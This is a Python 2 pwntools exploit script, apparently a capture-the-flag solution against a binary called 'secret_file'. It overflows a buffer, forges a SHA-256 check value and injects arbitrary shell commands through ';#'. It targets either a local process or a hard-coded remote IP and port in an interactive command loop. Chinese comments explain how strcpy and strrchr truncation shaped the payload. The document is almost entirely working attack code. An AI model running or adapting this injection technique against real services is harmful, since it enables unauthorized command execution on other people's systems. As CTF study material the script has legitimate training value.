#coding:utf-8

from pwn import *
import hashlib

#context.log_level = 'debug'

debug = 1


def exp(string, debug):
	if debug == 1:
		r = process('./secret_file')
		#gdb.attach(r)
		#pause
	else:
		r = remote('111.198.29.45', 37598)


	payload = 'a' * 0x100

	memory = ''

	sha256 = hashlib.sha256(payload).hexdigest()

	for i in range(0, len(sha256), 2):
		memory = memory + chr(int(sha256[i:i + 2], 16))

	memory = list(memory + '\x00' * 0x41)

	for i in range(0x20):
		tmp = '%02x'%ord(memory[i]) + '\x00'
		memory[0x20 + 2 * i] = tmp[0]
		memory[0x20 + 2 * i + 1] = tmp[1]
		memory[0x20 + 2 * i + 2] = tmp[2]

	v15 = ''.join([i for i in memory[0x20:-1]])
	
	'''
		string中不要用\x00填充
		payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, '\x00') + v15 + '\n'
		否则strcpy的时候会进行截断，v15无法正常输入
	'''

	'''
		v15后面不要跟\x00
		payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, ' ') + v15 + '\x00\n'
		否则strrchr的时候，str会以\x00作为结尾，则\n被截断
	'''

	payload = payload + (string + ';#').ljust(0x1f8 - 0x1dd, ' ') + v15 + '\n'

	r.send(payload)
	
	log.info('%s\n'%r.recv())
	r.close()
	

while True:
	print '[*] $ ',
	command = raw_input()[:-1]
	if command == 'exit':
		break
	exp(command, debug)	

